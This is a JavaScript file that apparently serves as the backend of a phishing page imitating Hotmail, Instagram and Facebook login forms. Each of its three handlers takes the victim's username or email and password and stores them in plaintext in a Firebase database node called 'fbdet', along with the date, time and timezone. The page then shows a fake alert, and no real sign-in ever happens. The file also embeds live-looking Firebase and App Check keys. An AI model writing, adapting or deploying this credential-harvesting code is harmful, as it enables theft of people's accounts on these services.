// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyBzVQT_1FL--xcIac54JCoyknLGQlWkTro",
  authDomain: "dbprominate.firebaseapp.com",
  databaseURL: "https://dbprominate-default-rtdb.firebaseio.com",
  projectId: "dbprominate",
  storageBucket: "dbprominate.firebasestorage.app",
  messagingSenderId: "765077620179",
  appId: "1:765077620179:web:e24eb10e42cb0bc21e9b26"
};


firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function showAlert() {
  document.getElementById("customAlert").style.display = "block";
}

function closeAlert() {
  document.getElementById("customAlert").style.display = "none";
}

function hmlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      alert("Error: " + errorMessage);
    });

  var email = document.getElementById("hm-email").value;
  var password = document.getElementById("hm-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Hotmail";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(); // Show custom modal
      document.getElementById("hm-pass").value = "";
      return false;
    }, 2000);
  }
}

function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      alert("Error: " + errorMessage);
    });

  var username = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(); // Show custom modal
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      alert("Error: " + errorMessage);
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(); // Show custom modal
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  }
}
